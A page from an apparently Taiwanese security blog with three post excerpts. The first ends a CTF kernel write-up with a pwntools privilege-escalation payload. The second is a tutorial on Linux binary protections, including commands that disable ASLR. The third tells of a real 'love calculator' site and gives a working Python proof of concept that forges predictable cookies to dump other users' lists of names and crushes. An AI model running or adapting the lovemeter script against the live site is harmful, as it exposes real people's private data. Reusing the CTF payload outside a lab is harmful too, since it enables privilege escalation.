<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> b64encode</span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">"amd64"</span></span><br><span class="line"></span><br><span class="line">payload  = <span class="string">b"P4"</span>             <span class="comment"># magic</span></span><br><span class="line">payload += p8(<span class="number">0</span>)             <span class="comment"># version</span></span><br><span class="line">payload += p8(<span class="number">1</span>)             <span class="comment"># type</span></span><br><span class="line">payload += p32(<span class="number">2</span>)            <span class="comment"># mapping_count</span></span><br><span class="line">payload += p64(<span class="number">0x18</span>)         <span class="comment"># mapping_offset</span></span><br><span class="line">payload += p64(<span class="number">0x400048</span>)     <span class="comment"># entry</span></span><br><span class="line"></span><br><span class="line">leak_cred = <span class="number">0xffff9855c758c0c0</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># mapping</span></span><br><span class="line">payload += flat(</span><br><span class="line">    <span class="number">0x400000</span> | <span class="number">7</span>,</span><br><span class="line">    <span class="number">0x1000</span>,</span><br><span class="line">    <span class="number">0</span>,</span><br><span class="line"></span><br><span class="line">    (leak_cred | <span class="number">8</span>) + <span class="number">0x10</span>,</span><br><span class="line">    <span class="number">0x20</span>,</span><br><span class="line">    <span class="number">0</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">payload += asm(shellcraft.cat(<span class="string">"/flag"</span>) + shellcraft.exit())</span><br><span class="line"></span><br><span class="line">print(<span class="string">f'echo <span class="subst">&#123;b64encode(payload).decode()&#125;</span> | base64 -d &gt; a ; chmod +x a ; ./a'</span>)</span><br></pre></td></tr></table></figure>
<hr>
<ol>
<li><a href="https://github.com/david942j/ctf-writeups/tree/master/teaser-confidence-quals-2019/p4fmt">https://github.com/david942j/ctf-writeups/tree/master/teaser-confidence-quals-2019/p4fmt</a></li>
<li><a href="https://devcraft.io/2019/03/19/p4fmt-confidence-ctf-2019-teaser.html">https://devcraft.io/2019/03/19/p4fmt-confidence-ctf-2019-teaser.html</a></li>
<li><a href="https://amritabi0s.wordpress.com/2019/03/19/confidence-ctf-p4fmt-write-up/">https://amritabi0s.wordpress.com/2019/03/19/confidence-ctf-p4fmt-write-up/</a></li>
</ol>

        </div>
        
        
        <div class="level is-mobile readmore-button">
            <div class="level-start">
                <div class="level-item">
                <a class="button is-size-7 is-light" href="/2019/04/26/security/writeups/p4fmt/#more">Read More</a>
                </div>
            </div>
        </div>
        
        
    </div>
</div>








    
<div class="card card-readmore">
    
    <div class="card-content article ">
        
        <div class="level article-meta is-size-7 is-uppercase is-mobile is-overflow-x-auto">
            <div class="level-left">
                <time class="level-item has-text-grey" datetime="2019-03-20T16:00:00.000Z">2019-03-21</time>
                
                <div class="level-item">
                <a class="has-link-grey -link" href="/categories/security/">security</a>&nbsp;/&nbsp;<a class="has-link-grey -link" href="/categories/security/pwn/">pwn</a>
                </div>
                
                
                <span class="level-item has-text-grey">
                    
                    
                    2 minutes read (About 342 words)
                </span>
                
                
            </div>
        </div>
        
        <h1 class="title is-size-3 is-size-4-mobile has-text-weight-normal">
            
                <a class="has-link-black-ter" href="/2019/03/21/security/pwn/protection/">Linux 程序保護機制</a>
            
        </h1>
        <div class="content">
            <h2 id="RELRO-RELocation-Read-Only"><a class="header-anchor" href="#RELRO-RELocation-Read-Only"></a>RELRO (RELocation Read Only)</h2>
<table>
<thead>
<tr>
<th style="text-align:center">RELRO</th>
<th style="text-align:center">說明</th>
<th style="text-align:center">gcc 編譯參數</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">No</td>
<td style="text-align:center">GOT writable, <code>link_map</code> writable</td>
<td style="text-align:center"><code>gcc -Wl,-z,norelro code.c</code></td>
</tr>
<tr>
<td style="text-align:center">Partial</td>
<td style="text-align:center">GOT writable, <code>link_map</code> readonly</td>
<td style="text-align:center">DEFAULT</td>
</tr>
<tr>
<td style="text-align:center">Full</td>
<td style="text-align:center">GOT read only, no <code>link_map</code> and <code>dl_resolver</code> pointer</td>
<td style="text-align:center"><code>gcc -Wl,-z,relro,-z,now code.c</code></td>
</tr>
</tbody>
</table>
<h2 id="CANARY"><a class="header-anchor" href="#CANARY"></a>CANARY</h2>
<p><a href="https://stackoverflow.com/questions/24465014/gcc-generate-canary-or-not">stack overflow - gcc generate canary or not</a></p>
<table>
<thead>
<tr>
<th style="text-align:center">Canary</th>
<th style="text-align:center">gcc 編譯參數</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">Enable</td>
<td style="text-align:center">DEFAULT (when buffer large enough)</td>
</tr>
<tr>
<td style="text-align:center">Disable</td>
<td style="text-align:center"><code>gcc -fno-stack-protector code.c</code></td>
</tr>
</tbody>
</table>
<h2 id="NX-No-Execute-DEP-Data-Execution-Prevention"><a class="header-anchor" href="#NX-No-Execute-DEP-Data-Execution-Prevention"></a>NX (No-Execute) / DEP (Data Execution Prevention)</h2>
<p>可以寫的地方不能執行</p>
<table>
<thead>
<tr>
<th style="text-align:center">NX / DEP</th>
<th style="text-align:center">gcc 編譯參數</th>
<th style="text-align:center">execstack</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">Enable</td>
<td style="text-align:center">DEFAULT</td>
<td style="text-align:center"><code>execstack -s code</code></td>
</tr>
<tr>
<td style="text-align:center">Disable</td>
<td style="text-align:center"><code>gcc -z execstack code.c</code></td>
<td style="text-align:center"><code>execstack -c code</code></td>
</tr>
</tbody>
</table>
<h2 id="ASLR-Address-Space-Layout-Randomization"><a class="header-anchor" href="#ASLR-Address-Space-Layout-Randomization"></a>ASLR (Address Space Layout Randomization)</h2>
<p><a href="https://linux-audit.com/linux-aslr-and-kernelrandomize_va_space-setting/">Configuring ASLR with randomize_va_space</a></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">0 - 表示關閉進程地址空間隨機化。</span><br><span class="line">1 - 表示 mmap, stack, vdso 隨機化。</span><br><span class="line">2 - 表示比 1 多了 heap 隨機化。</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo -s echo 0 &gt; &#x2F;proc&#x2F;sys&#x2F;kernel&#x2F;randomize_va_space</span><br><span class="line">sudo sysctl -w kernel.randomize_va_space&#x3D;0</span><br></pre></td></tr></table></figure>
<h2 id="PIE-Position-Independent-Executables"><a class="header-anchor" href="#PIE-Position-Independent-Executables"></a>PIE (Position Independent Executables)</h2>
<table>
<thead>
<tr>
<th style="text-align:center">PIE</th>
<th style="text-align:center">gcc 編譯參數</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">Enable</td>
<td style="text-align:center"><code>gcc -fpie -pie code.c</code></td>
</tr>
<tr>
<td style="text-align:center">Disable</td>
<td style="text-align:center">DEFAULT</td>
</tr>
</tbody>
</table>
<h2 id="FRAME-POINTER"><a class="header-anchor" href="#FRAME-POINTER"></a>FRAME POINTER</h2>
<p>有開的話是</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">leave</span><br><span class="line">ret</span><br></pre></td></tr></table></figure>
<p>沒開的話是</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">add rsp, 0x18</span><br><span class="line">ret</span><br></pre></td></tr></table></figure>
<table>
<thead>
<tr>
<th style="text-align:center">Canary</th>
<th style="text-align:center">gcc 編譯參數</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">Enable</td>
<td style="text-align:center">DEFAULT</td>
</tr>
<tr>
<td style="text-align:center">Disable</td>
<td style="text-align:center"><code>gcc -fomit-frame-pointer code.c</code></td>
</tr>
</tbody>
</table>
<h2 id="checksec"><a class="header-anchor" href="#checksec"></a><a href="https://github.com/slimm609/checksec.sh">checksec</a></h2>
<p><a href="https://github.com/slimm609/checksec.sh">checksec</a> 是一個用來查看上述所說的保護機制的 bash script</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols         FORTIFY Fortified       Fortifiable  FILE</span><br><span class="line">Full RELRO      No canary found   NX enabled    PIE enabled     No RPATH   No RUNPATH   65 Symbols     No       0               1       .&#x2F;hello</span><br></pre></td></tr></table></figure>
<p>pwntools 也有內建一個名字和功能都一樣的指令</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Full RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      PIE enabled</span><br></pre></td></tr></table></figure>
        </div>
        
        
        <div class="level is-mobile readmore-button">
            <div class="level-start">
                <div class="level-item">
                <a class="button is-size-7 is-light" href="/2019/03/21/security/pwn/protection/#more">Read More</a>
                </div>
            </div>
        </div>
        
        
    </div>
</div>








    
<div class="card card-readmore">
    
    <div class="card-content article ">
        
        <div class="level article-meta is-size-7 is-uppercase is-mobile is-overflow-x-auto">
            <div class="level-left">
                <time class="level-item has-text-grey" datetime="2018-11-20T16:00:00.000Z">2018-11-21</time>
                
                
                <span class="level-item has-text-grey">
                    
                    
                    5 minutes read (About 722 words)
                </span>
                
                
            </div>
        </div>
        
        <h1 class="title is-size-3 is-size-4-mobile has-text-weight-normal">
            
                <a class="has-link-black-ter" href="/2018/11/21/lovemeter/">【資安小故事】餅乾猜猜樂</a>
            
        </h1>
        <div class="content">
            <p>事情是這樣的，我在別人的挨居的自介上面看到一個連結，就好奇的點了進去</p>
<p align="center"><img data-src="/images/lovemeter-1.png" class=" lazyload"  width="500" title="lovemeter 首頁"></p>
<p>裡面看起來就是那種心裡測驗的網站，愛情計算器，幫你測你和喜歡的人配不配</p>
<p>聰明如我<del>資安小天才</del>，當然是隨便亂打個 abcd 就送出看看這是在耍什麼花樣</p>
<p align="center"><img data-src="/images/lovemeter-2.png" class=" lazyload"  width="500" title="lovemeter 計算結果頁面"></p>
<p>果然是愚弄人的網站，如果你誠實的填上你的名字和你喜歡的人的名字，就被分享給你連結的人看光光啦</p>
<p>在你生氣的同時，這個網站就很好心的讓你註冊一下好發洩怨氣</p>
<p>那我當然也順手按了一下註冊（免錢的隨手按一下），這時候就可以把連結分享給別人囉</p>
<p>這個可以看中了我的圈套的受害者名單的頁面，我只要把 cookie 清掉，就會被帶到前面第一個愛情計算器（陷阱）頁面，代表他有用 cookie 去驗證你是誰</p>
<ul>
<li>有對的 cookie 他會給我受害者名單</li>
<li>不對的 cookie 他會讓我掉進陷阱</li>
</ul>
<p>那在看看他的 cookie 之前眼尖的我，就發現他的 url 有些地方像像的，而且後面的 userid 很短</p>
<ul>
<li><code>https://cn.lovemeter.me/user/5S1X</code></li>
<li><code>https://cn.lovemeter.me/user/5S1Y</code></li>
<li><code>https://cn.lovemeter.me/user/5S1Z</code></li>
</ul>
<p>多註冊幾次會發現，他的 userid 怎麼感覺好像是每次 counter++</p>
<p>再多嘗試幾次，就會發現 userid 的字元只會是 <code>0-9a-zA-Z</code> 的字元組成</p>
<p>然後重點是他的 cookie 是個數字，而且完完全全是 counter++ 的樣子</p>
<ul>
<li><code>user_quiz_1399337=1399337</code></li>
<li><code>user_quiz_1399337=1399338</code></li>
<li><code>user_quiz_1399337=1399339</code></li>
</ul>
<p>那這個 userid 跟這個 cookie 的 id 的對照是怎麼樣的呢</p>
<p>猜一猜就能發現他其實是把 <code>0-9a-zA-Z</code> 當成 <code>0-61</code> 的 62 進位（很合理吧）</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">convert(<span class="string">'5S1X'</span>) =  <span class="number">5</span> * (<span class="number">62</span> ** <span class="number">3</span>) +</span><br><span class="line">                  <span class="number">54</span> * (<span class="number">62</span> ** <span class="number">2</span>) +</span><br><span class="line">                   <span class="number">1</span> * (<span class="number">62</span> ** <span class="number">1</span>) +</span><br><span class="line">                  <span class="number">59</span> * (<span class="number">62</span> ** <span class="number">0</span>) = <span class="number">1399337</span></span><br></pre></td></tr></table></figure>
<p>那我們只要把他的 userid 轉回數字，並新增個 cookie，就能成功看到別人的受害者名單囉</p>
<h2 id="Proof-Of-Concept-POC"><a class="header-anchor" href="#Proof-Of-Concept-POC"></a>Proof Of Concept ( POC )</h2>
<figure class="highlight python"><figcaption><span>source code</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">from</span> prettytable <span class="keyword">import</span> PrettyTable</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> len(sys.argv) &lt; <span class="number">2</span>:</span><br><span class="line">    print(<span class="string">'usage: ./lovemeter.py (url)'</span>)</span><br><span class="line">    exit(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">value = string.digits + string.ascii_letters</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">uid2num</span><span class="params">(uid)</span>:</span></span><br><span class="line">    num = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> ch <span class="keyword">in</span> uid:</span><br><span class="line">        v = value.index(ch)</span><br><span class="line">        num = num * len(value) + v</span><br><span class="line">    <span class="keyword">return</span> num</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">num2uid</span><span class="params">(num)</span>:</span></span><br><span class="line">    uid = <span class="string">''</span></span><br><span class="line">    <span class="keyword">while</span> num &gt; <span class="number">0</span>:</span><br><span class="line">        v = num % len(value)</span><br><span class="line">        uid += value[v]</span><br><span class="line">        num //= len(value)</span><br><span class="line">    <span class="keyword">return</span> uid[::<span class="number">-1</span>]</span><br><span class="line"></span><br><span class="line">url = sys.argv[<span class="number">1</span>]</span><br><span class="line">r = re.search(<span class="string">'https:\/\/(\w+)\.lovemeter.me\/\w+\/(\w+)'</span>, url)</span><br><span class="line">prefix = r.group(<span class="number">1</span>)</span><br><span class="line">uid = r.group(<span class="number">2</span>)</span><br><span class="line">num = uid2num(uid)</span><br><span class="line"></span><br><span class="line">r = requests.get(<span class="string">f'https://<span class="subst">&#123;prefix&#125;</span>.lovemeter.me/other-user-stats/<span class="subst">&#123;uid&#125;</span>'</span>, headers = &#123;</span><br><span class="line">    <span class="string">'cookie'</span>: <span class="string">f'user_quiz_<span class="subst">&#123;num&#125;</span>=<span class="subst">&#123;num&#125;</span>'</span>,</span><br><span class="line">    <span class="string">'user-agent'</span>: <span class="string">'Mozilla/5.0 (iPhone; CPU iPhone OS 11_0 like Mac OS X) AppleWebKit/604.1.38 (KHTML, like Gecko) Version/11.0 Mobile/15A5370a Safari/604.1'</span></span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">data = json.loads(r.text)[<span class="string">'data'</span>]</span><br><span class="line">t = PrettyTable([<span class="string">'名字'</span>, <span class="string">'喜歡的人'</span>])</span><br><span class="line"><span class="keyword">for</span> item <span class="keyword">in</span> data:</span><br><span class="line">    item = json.loads(item)</span><br><span class="line">    t.add_row([item[<span class="string">'userFullName'</span>], item[<span class="string">'crushFullName'</span>]])</span><br><span class="line">print(t)</span><br></pre></td></tr></table></figure>
<figure class="highlight bash"><figcaption><span>usage</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python lovemeter.py https://cn.lovemeter.me/user/1234</span><br></pre></td></tr></table></figure>

        </div>
        
        
        <div class="level is-mobile readmore-button">
            <div class="level-start">
                <div class="level-item">
                <a class="button is-size-7 is-light" href="/2018/11/21/lovemeter/#more">Read More</a>
                </div>
            </div>
        </div>
        
        
    </div>
</div>









    
<div class="card card-transparent">
    <nav class="pagination is-centered" role="navigation" aria-label="pagination">
        <div class="pagination-previous">
            <a class="is-flex-grow has-text-black-ter" href="/tags/security/">Previous</a>
        </div>
        <div class="pagination-next is-invisible is-hidden-mobile">
            <a class="is-flex-grow has-text-black-ter" href="/tags/security/page/3/">Next</a>
        </div>
        <ul class="pagination-list is-hidden-mobile">
            
            <li><a class="pagination-link has-text-black-ter" href="/tags/security/">1</a></li>
            
            <li><a class="pagination-link is-current" href="/tags/security/page/2/">2</a></li>
            
        </ul>
    </nav>
</div>
</div>
                




<div class="column is-3-tablet is-3-desktop is-3-widescreen  has-order-1 column-left ">
    
        
<div class="card widget">
    <div class="card-content">
        <nav class="level">
            <div class="level-item has-text-centered" style="flex-shrink: 1">
                <div>
                    
                    <figure class="image is-128x128 has-mb-6">
                        <img class="is-rounded" src="https://www.gravatar.com/avatar/dd413429dc0e386a4dfdb890e39dd038?s=512" alt="oalieno">
                    </figure>
                    
                    <p class="is-size-4 is-block">
                        oalieno
                    </p>
                    
                    
                    
                    <p class="is-size-6 is-flex is-flex-center has-text-grey">
                        <i class="fas fa-map-marker-alt has-mr-7"></i>
                        <span>Taiwan</span>
                    </p>
                    
                </div>
            </div>
        </nav>
        <nav class="level is-mobile">
            <div class="level-item has-text-centered is-marginless">
                <div>
                    <p class="heading">
                        Posts
                    </p>
                    <a href="/archives">
                        <p class="title has-text-weight-normal">
                            24
                        </p>
                    </a>
                </div>
            </div>
            <div class="level-item has-text-centered is-marginless">
                <div>
                    <p class="heading">
                        Categories
                    </p>
                    <a href="/categories">
                        <p class="title has-text-weight-normal">
                            8
                        </p>
                    </a>
                </div>
            </div>
            <div class="level-item has-text-centered is-marginless">
                <div>
                    <p class="heading">
                        Tags
                    </p>
                    <a href="/tags">
                        <p class="title has-text-weight-normal">
                            41
                        </p>
                    </a>
                </div>
            </div>
        </nav>
        
        <div class="level">
            <a class="level-item button is-link is-rounded" href="https://github.com/oalieno" target="_blank" rel="noopener" style="border-radius: 3px">
                Follow</a>
        </div>
        
        
        
        <div class="level is-mobile">
            
            <a class="level-item button is-white is-marginless" target="_blank" rel="noopener"
                title="Github" href="https://github.com/oalieno">
                
                <i class="fab fa-github"></i>
                
            </a>
            
            <a class="level-item button is-white is-marginless" target="_blank" rel="noopener"
                title="Ig" href="https://www.instagram.com/oalieno">
                
                <i class="fab fa-ig"></i>
                
            </a>
            
            <a class="level-item button is-white is-marginless" target="_blank" rel="noopener"
                title="In" href="https://www.linkedin.com/in/oalieno/">
                
                <i class="fab fa-linkedin"></i>
                
            </a>
            
        </div>
        
    </div>
</div>
    
        
    
        
<div class="card widget">
    <div class="card-content">
        <div class="menu">
            <h3 class="menu-label">
                Categories
            </h3>
            <ul class="menu-list">
            <li>
        <a class="level is-marginless" href="/categories/algorithm/">
            <span class="level-start">
                <span class="level-item">algorithm</span>
            </span>
            <span class="level-end">
                <span class="level-item tag">1</span>
            </span>
        </a></li><li>
        <a class="level is-marginless" href="/categories/blockchain/">
            <span class="level-start">
                <span class="level-item">blockchain</span>
            </span>
            <span class="level-end">
                <span class="level-item tag">1</span>
            </span>
        </a></li><li>
        <a class="level is-marginless" href="/categories/security/">
            <span class="level-start">
                <span class="level-item">security</span>
            </span>
            <span class="level-end">
                <span class="level-item tag">13</span>
            </span>
        </a><ul><li>
        <a class="level is-marginless" href="/categories/security/news/">
            <span class="level-start">
                <span class="level-item">news</span>
            </span>
            <span class="level-end">
                <span class="level-item tag">1</span>
            </span>
        </a></li><li>
        <a class="level is-marginless" href="/categories/security/osint/">
            <span class="level-start">
                <span class="level-item">osint</span>
            </span>
            <span class="level-end">
                <span class="level-item tag">1</span>
            </span>
        </a></li><li>
        <a class="level is-marginless" href="/categories/security/pwn/">
            <span class="level-start">
                <span class="level-item">pwn</span>
            </span>
            <span class="level-end">
                <span class="level-item tag">3</span>
            </span>
        </a></li><li>
        <a class="level is-marginless" href="/categories/security/reverse/">
            <span class="level-start">
                <span class="level-item">reverse</span>
            </span>
            <span class="level-end">
                <span class="level-item tag">3</span>
            </span>
        </a></li><li>
        <a class="level is-marginless" href="/categories/security/writeups/">
            <span class="level-start">
                <span class="level-item">writeups</span>
            </span>
            <span class="level-end">
                <span class="level-item tag">5</span>
            </span>
        </a></li></ul></li>
            </ul>
        </div>
    </div>
</div>
    
        <div class="card widget">
    <div class="card-content">
        <h3 class="menu-label">
            Tag Cloud
        </h3>
        <a href="/tags/LINE-TAXI/" style="font-size: 10px;">LINE TAXI</a> <a href="/tags/adb/" style="font-size: 10px;">adb</a> <a href="/tags/algorithm/" style="font-size: 10px;">algorithm</a> <a href="/tags/android/" style="font-size: 13.33px;">android</a> <a href="/tags/blockchain/" style="font-size: 11.67px;">blockchain</a> <a href="/tags/burp/" style="font-size: 10px;">burp</a> <a href="/tags/command/" style="font-size: 10px;">command</a> <a href="/tags/crypto/" style="font-size: 10px;">crypto</a> <a href="/tags/ctf/" style="font-size: 18.33px;">ctf</a> <a href="/tags/dapper-labs/" style="font-size: 10px;">dapper labs</a> <a href="/tags/drony/" style="font-size: 10px;">drony</a> <a href="/tags/flow/" style="font-size: 10px;">flow</a> <a href="/tags/frida/" style="font-size: 11.67px;">frida</a> <a href="/tags/gdb/" style="font-size: 10px;">gdb</a> <a href="/tags/hexo/" style="font-size: 13.33px;">hexo</a> <a href="/tags/icarus/" style="font-size: 13.33px;">icarus</a> <a href="/tags/iterm2/" style="font-size: 10px;">iterm2</a> <a href="/tags/kernel/" style="font-size: 10px;">kernel</a> <a href="/tags/netflix/" style="font-size: 10px;">netflix</a> <a href="/tags/news/" style="font-size: 10px;">news</a> <a href="/tags/nord/" style="font-size: 10px;">nord</a> <a href="/tags/nox/" style="font-size: 10px;">nox</a> <a href="/tags/osint/" style="font-size: 10px;">osint</a> <a href="/tags/powerlevel10k/" style="font-size: 10px;">powerlevel10k</a> <a href="/tags/powerlevel9k/" style="font-size: 10px;">powerlevel9k</a> <a href="/tags/proxy/" style="font-size: 10px;">proxy</a> <a href="/tags/pwn/" style="font-size: 15px;">pwn</a> <a href="/tags/pyc/" style="font-size: 10px;">pyc</a> <a href="/tags/python/" style="font-size: 10px;">python</a> <a href="/tags/reverse/" style="font-size: 15px;">reverse</a> <a href="/tags/reverse-ssh/" style="font-size: 10px;">reverse ssh</a> <a href="/tags/rootkit/" style="font-size: 10px;">rootkit</a> <a href="/tags/rsa/" style="font-size: 10px;">rsa</a> <a href="/tags/security/" style="font-size: 20px;">security</a> <a href="/tags/seo/" style="font-size: 10px;">seo</a> <a href="/tags/srop/" style="font-size: 10px;">srop</a> <a href="/tags/ssh/" style="font-size: 10px;">ssh</a> <a href="/tags/tunnel/" style="font-size: 10px;">tunnel</a> <a href="/tags/writeups/" style="font-size: 16.67px;">writeups</a> <a href="/tags/zimfw/" style="font-size: 10px;">zimfw</a> <a href="/tags/zsh/" style="font-size: 10px;">zsh</a>
    </div>
</div>
    
        <div class="card widget">
    <div class="card-content">
        <h3 class="menu-label">
            Recent
        </h3>
        
        <article class="media">
            
            <div class="media-content">
                <div class="content">
                    <div><time class="has-text-grey is-size-7 is-uppercase" datetime="2021-02-26T16:06:00.000Z">2021-02-27</time></div>
                    <a href="/2021/02/27/blockchain/flow/" class="title has-link-black-ter is-size-6 has-text-weight-normal">【項目介紹】Flow ( Dapper Labs )</a>
                    <p class="is-size-7 is-uppercase">
                        <a class="has-link-grey -link" href="/categories/blockchain/">blockchain</a>
                    </p>
                </div>
            </div>
        </article>
        
        <article class="media">
            
            <div class="media-content">
                <div class="content">
                    <div><time class="has-text-grey is-size-7 is-uppercase" datetime="2020-08-16T08:24:04.000Z">2020-08-16</time></div>
                    <a href="/2020/08/16/security/news/clipboard-hijack/" class="title has-link-black-ter is-size-6 has-text-weight-normal">Clipboard hijacking cryptocurrency malware on tradingview.com</a>
                    <p class="is-size-7 is-uppercase">
                        <a class="has-link-grey -link" href="/categories/security/">security</a> / <a class="has-link-grey -link" href="/categories/security/news/">news</a>
                    </p>
                </div>
            </div>
        </article>
        
        <article class="media">
            
            <div class="media-content">
                <div class="content">
                    <div><time class="has-text-grey is-size-7 is-uppercase" datetime="2020-07-30T16:29:25.000Z">2020-07-31</time></div>
                    <a href="/2020/07/31/security/osint/maltego/" class="title has-link-black-ter is-size-6 has-text-weight-normal">【小工具】Maltego</a>
                    <p class="is-size-7 is-uppercase">
                        <a class="has-link-grey -link" href="/categories/security/">security</a> / <a class="has-link-grey -link" href="/categories/security/osint/">osint</a>
                    </p>
                </div>
            </div>
        </article>
        
        <article class="media">
            
            <div class="media-content">
                <div class="content">
                    <div><time class="has-text-grey is-size-7 is-uppercase" datetime="2020-06-09T14:29:00.000Z">2020-06-09</time></div>
                    <a href="/2020/06/09/security/writeups/ais3-2020-preexam/" class="title has-link-black-ter is-size-6 has-text-weight-normal">【Writeups】AIS3 pre-exam 2020</a>
                    <p class="is-size-7 is-uppercase">
                        <a class="has-link-grey -link" href="/categories/security/">security</a> / <a class="has-link-grey -link" href="/categories/security/writeups/">writeups</a>
                    </p>
                </div>
            </div>
        </article>
        
        <article class="media">
            
            <div class="media-content">
                <div class="content">
                    <div><time class="has-text-grey is-size-7 is-uppercase" datetime="2020-05-04T06:33:13.000Z">2020-05-04</time></div>
                    <a href="/2020/05/04/security/writeups/f-hash/" class="title has-link-black-ter is-size-6 has-text-weight-normal">【Writeups】VolgaCTF Quals 2020 - F-Hash</a>
                    <p class="is-size-7 is-uppercase">
                        <a class="has-link-grey -link" href="/categories/security/">security</a> / <a class="has-link-grey -link" href="/categories/security/writeups/">writeups</a>
                    </p>
                </div>
            </div>
        </article>
        
    </div>
</div>
    
        <div class="card widget">
    <div class="card-content">
        <div class="menu">
        <h3 class="menu-label">
            Archives
        </h3>
        <ul class="menu-list">
        
        <li>
            <a class="level is-marginless" href="/archives/2021/02/">
                <span class="level-start">
                    <span class="level-item">February 2021</span>
                </span>
                <span class="level-end">
                    <span class="level-item tag">1</span>
                </span>
            </a>
        </li>
        
        <li>
            <a class="level is-marginless" href="/archives/2020/08/">
                <span class="level-start">
                    <span class="level-item">August 2020</span>
                </span>
                <span class="level-end">
                    <span class="level-item tag">1</span>
                </span>
            </a>
        </li>
        
        <li>
            <a class="level is-marginless" href="/archives/2020/07/">
                <span class="level-start">
                    <span class="level-item">July 2020</span>
                </span>
                <span class="level-end">
                    <span class="level-item tag">1</span>
                </span>
            </a>
        </li>
        
        <li>
            <a class="level is-marginless" href="/archives/2020/06/">
                <span class="level-start">
                    <span class="level-item">June 2020</span>
                </span>
                <span class="level-end">
                    <span class="level-item tag">1</span>
                </span>
            </a>
        </li>
        
        <li>
            <a class="level is-marginless" href="/archives/2020/05/">
                <span class="level-start">
                    <span class="level-item">May 2020</span>
                </span>
                <span class="level-end">
                    <span class="level-item tag">1</span>
                </span>
            </a>
        </li>
        
        <li>
            <a class="level is-marginless" href="/archives/2020/03/">
                <span class="level-start">
                    <span class="level-item">March 2020</span>
                </span>
                <span class="level-end">
                    <span class="level-item tag">1</span>
                </span>
            </a>
        </li>
        
        <li>
            <a class="level is-marginless" href="/archives/2020/02/">
                <span class="level-start">
                    <span class="level-item">February 2020</span>
                </span>
                <span class="level-end">
                    <span class="level-item tag">5</span>
                </span>
            </a>
        </li>
        
        <li>
            <a class="level is-marginless" href="/archives/2020/01/">
                <span class="level-start">
                    <span class="level-item">January 2020</span>
                </span>
                <span class="level-end">
                    <span class="level-item tag">2</span>
                </span>
            </a>
        </li>
        
        <li>
            <a class="level is-marginless" href="/archives/2019/09/">
